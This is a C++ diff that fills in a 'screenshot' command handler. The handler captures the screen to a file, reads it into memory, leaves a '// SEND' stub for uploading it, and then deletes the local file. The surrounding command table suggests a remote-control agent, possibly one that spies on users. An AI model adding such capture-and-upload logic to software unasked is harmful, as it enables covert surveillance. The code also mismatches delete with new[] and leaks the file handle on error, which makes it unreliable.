@@ -60,7 +60,24 @@ command_t commandDefs[] = {
     {
         "screenshot", [](std::vector<std::string> args) {
             screenshot.TakeScreenshot(_T("screen.png"));
-            // upload and then delete
+			FILE *fp;
+			errno_t error = fopen_s(&fp, "screen.png", "rb");
+			if(!fp || error) {
+				Error(_T("fopen_s failed"));
+				return;
+			}
+			fseek(fp, 0, SEEK_END);
+			size_t size = ftell(fp);
+			fseek(fp, 0, SEEK_SET);
+			char *buffer = new char[size];
+			if(fread_s(buffer, size, 1, size, fp) != size) {
+				Error(_T("fread_s did not return size"));
+				return;
+			}
+			fclose(fp);
+			// SEND
+			delete buffer;
+			DeleteFile(_T("screen.png"));
         }
     },
     {
